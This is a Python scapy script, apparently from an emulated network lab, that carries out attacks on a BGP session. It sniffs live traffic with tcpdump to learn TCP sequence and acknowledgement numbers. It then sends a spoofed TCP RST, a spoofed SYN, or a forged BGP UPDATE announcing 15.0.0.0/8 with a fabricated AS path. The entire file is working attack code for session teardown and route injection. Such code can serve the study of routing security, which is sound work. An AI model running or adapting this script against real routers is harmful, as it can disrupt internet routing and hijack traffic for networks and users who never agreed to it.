#!/usr/bin/env python

import os
import sys
import ctypes
import signal

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint
from utils import log, log2
from custom_classes import CustomBGPPathAttribute


load_contrib("bgp")


SOURCE_ADDRESS = '9.0.1.2'
DESTINATION_ADDRESS = '9.0.1.1'

BLIND_RST_ATTACK_COLLECT_TIME = 15 * 4 # <keepalive> * 4
BLIND_SYN_ATTACK_COLLECT_TIME = 15 * 2 # <keepalive> * 2
BLIND_DATA_ATTACK_COLLECT_TIME = 45 + 15 * 2 # <hold-timer> + <keep-alive> * 2


def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
	log('Sending TCP RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	# attack with conf 1 or conf 2 acts in the same way

	# conf 1
	#tcp = TCP(flags="RA")
	#tcp.ack=int(ackNum)
	
	# conf 2
	tcp = TCP(flags="R")
	tcp.ack=0

	tcp.sport=int(srcPort)
	tcp.dport=int(dstPort)
	tcp.seq=int(seqNum)
	tcp.window=int(win)

	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface=iface)


def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
	log('Sending TCP SYN packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	# swapping ports
	srcPort, dstPort = dstPort, srcPort

	tcp = TCP(flags="S")
	tcp.sport=int(srcPort)
	tcp.dport=int(dstPort)
	tcp.seq=0
	tcp.ack=0
	tcp.window=int(win)

	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface=iface)


def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
	log('Sending BGP UPDATE packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	srcPort=int(srcPort)
	dstPort=int(dstPort)
	seqNum=int(seqNum)
	ackNum=int(ackNum)
	win=int(win)

	paORIGIN = BGPPathAttribute(flags = 0x40, type = 1, attr_len = 1, value = '\x00')

	# PathAttribute [AS-SEQ (2)][ ASN# (1)][ ASN (300)]
	paAS = CustomBGPPathAttribute(flags = 0x50, type = 2, attr_len = 6, value = '\x02\x01\x00\x00\x00\x03')
	
	# Path Next Hop [IP (9.0.1.2)]
	paNEXTHOP = BGPPathAttribute(flags = 0x40 , type = 3, attr_len = 4, value = '\x09\x00\x01\x02')

	# Multiple Exit Discriminator [0000]
	#paMED= BGPPathAttribute(flags = 0x80 , type = 4, attr_len = 4, value = '\x00\x00\x00\x00')

	#paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(8 , '15.0.0.0')])
	paBGPU = BGPUpdate(tp_len = 21, total_path = [paORIGIN , paAS , paNEXTHOP], nlri = [(8 , '15.0.0.0')])
	
	# BGPHeader(len = 53, type = 2)/\
	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 255)/\
		TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum, window = win)/\
		BGPHeader(len = 46, type = 2)/\
		paBGPU

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface=iface)


def extract_ports_and_numbers(row, srcIP, dstIP):
	srcPort, dstPort, seqNum, ackNum, win = None, None, None, None, None

	values = row.split(' ')

	a = values[2].split('.')
	srcAddr = '.'.join(a[0:4])

	b = values[4].replace(':', '').split('.')
	dstAddr = '.'.join(b[0:4])

	l = values[20].replace(':', '')

	#if srcAddr == srcIP and dstAddr == dstIP and 
	if values[7] == 'seq' and l == '0':
		srcPort = a[4]
		dstPort = b[4]

		values[8] = values[8].replace(',', '')

		if ':' in values[8]:
			seqNum = values[8].split(':')[1]
		else:
			seqNum = values[8]

		ackNum = values[10].replace(',', '')

		win = values[12].replace(',', '')

	return srcPort, dstPort, seqNum, ackNum, win


def packet_is_ACK(row):
	values = row.split(' ')

	if values[7] == 'ack' and values[18].replace('\n', '') == '0':
		return True
	else:
		return False


def analyze_first_row(row):
	print 'processing first row'
	print row

	values = row.split(' ')

	for i, v in enumerate(values):
		print '[', i, ']', v

	sys.stdout.flush()

	# 9.0.1.1.179
	# extract address and port
	a = values[2].split('.')
	sa = '.'.join(a[0:4])
	sp = a[4]

	b = values[4].split('.')
	da = '.'.join(b[0:4])
	dp = b[4].replace(':', '')

	a = values[10].replace(',', '')
	s = values[8].replace(',', '').split(':')[1]

	w = values[12].replace(',', '')

	return sa, da, sp, dp, a, s, w


def analyze_second_row(row):
	print 'processing second row'
	print row

	values = row.split(' ')

	for i, v in enumerate(values):
		print '[', i, ']', v

	sys.stdout.flush()

	if values[7] == 'ack':
		# this is an ACK
		return True, True, True, True, True, True, True
	else:
		return analyze_first_row(row)


def analyze_third_row(row):
	print 'processing third row'
	print row

	sys.stdout.flush()

	return True, True, True, True, True, True, True


def choose_ports_and_numbers(srcIP, sa, da, sp, dp, a, s, w):
	if sa == srcIP:
		return sp, dp, a, s, w
	else: 
		# ports and numbers are switched
		# as the attack BGP UPDATE is sent in the opposite direction
		return dp, sp, s, a, w


def retrieve_ports_and_numbers(iface, srcIP, dstIP):
	# cerco un ack
	# in base a src e a dst prelevi AN e SN
	# e li usi per l'UPDATE BGP
	p = Popen(('sudo', 'tcpdump', '-i', iface, '-lnS', 'not arp'), stdout=PIPE)

	phase = 0
	row1 = None
	row2 = None
	row3 = None

	rows = list()

	for row in iter(p.stdout.readline, b''):
		values = row.split(' ')

		if phase == 1:
			rows.append(row)

			if packet_is_ACK(row):
				# avoiding processing 2 packets exchange
				# e.g. KEEPALIVE; ACK;
				if len(rows) < 3:
					rows = list()
				else:
					break

		if phase == 0:
			if packet_is_ACK(row):
				phase = 1
	
	p.kill()

	if len(rows) > 2:
		row1 = rows[-3]
		row2 = rows[-2]
		row3 = rows[-1]
	else:
		row1 = rows[-2]
		row2 = rows[-1]

	print row1
	print row2
	print row3

	sa1, da1, sp1, dp1, a1, s1, w1 = analyze_first_row(row1)

	sa2, da2, sp2, dp2, a2, s2, w2 = analyze_second_row(row2)
	if sa2 == True:
		print 'case 2'

		return choose_ports_and_numbers(srcIP, sa1, da1, sp1, dp1, a1, s1, w1)
	
	sa3, da3, sp3, dp3, a3, s3, w3 = analyze_third_row(row3)
	if sa3 == True:
		print 'case 3'

		return choose_ports_and_numbers(srcIP, sa2, da2, sp2, dp2, a2, s2, w2)


def main():
	choice = int(sys.argv[1])
	assert choice >= 1
	assert choice <= 3

	remote_flag = int(sys.argv[2])
	assert remote_flag >= 0
	assert remote_flag <= 1

	iface = None
	eth0_mac_address = sys.argv[3]
	eth1_mac_address = sys.argv[4]
	r2_eth4_mac_address = sys.argv[5]
	r2_eth5_mac_address = sys.argv[6]

	#print 'eth0_mac_address', eth0_mac_address
	#print 'eth1_mac_address', eth1_mac_address
	#print 'r2_eth4_mac_address', r2_eth4_mac_address
	#print 'r2_eth5_mac_address', r2_eth5_mac_address

	log('wait for the attacker to retrieve AN and SN\n', 'yellow')

	sys.stdout.flush()

	# recupero AN e SN per evitare il bruteforce di AN e SN
	srcPort, dstPort, ackNum, seqNum, win = retrieve_ports_and_numbers('atk1-eth1', SOURCE_ADDRESS, DESTINATION_ADDRESS)

	if remote_flag == 0:
		iface = 'atk1-eth1'
		src_mac_address = eth1_mac_address
		dst_mac_address = r2_eth5_mac_address
	else:
		iface = 'atk1-eth0'
		src_mac_address = eth0_mac_address
		dst_mac_address = r2_eth4_mac_address

	assert iface is not None
	assert src_mac_address is not None
	assert dst_mac_address is not None
	assert srcPort is not None
	assert dstPort is not None
	assert seqNum is not None
	assert ackNum is not None
	assert win is not None

	print os.popen('date +\"%T.%6N\"').read()
	print 'iface', iface
	print 'src mac address', src_mac_address
	print 'dst mac address', dst_mac_address
	print 'src port', srcPort
	print 'dst port', dstPort
	print 'seq number', seqNum
	print 'ack number', ackNum
	print 'window', win
	print

	sys.stdout.flush()

	collect_time = 0

	if choice == 1:
		send_rst_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
		collect_time = BLIND_RST_ATTACK_COLLECT_TIME
	elif choice == 2:
		send_syn_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
		collect_time = BLIND_SYN_ATTACK_COLLECT_TIME
	else:
		send_update_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
		collect_time = BLIND_DATA_ATTACK_COLLECT_TIME

	log('Close "attacks.err content" terminal', 'red')
	log2('packets collection', collect_time, 'red')

	log('Packets collected', 'red')
	log('After closing this terminal', 'red')
	log('select 0 on main menu', 'red')
	log('and check opened pcap capture files', 'red')


if __name__ == "__main__":
	main()
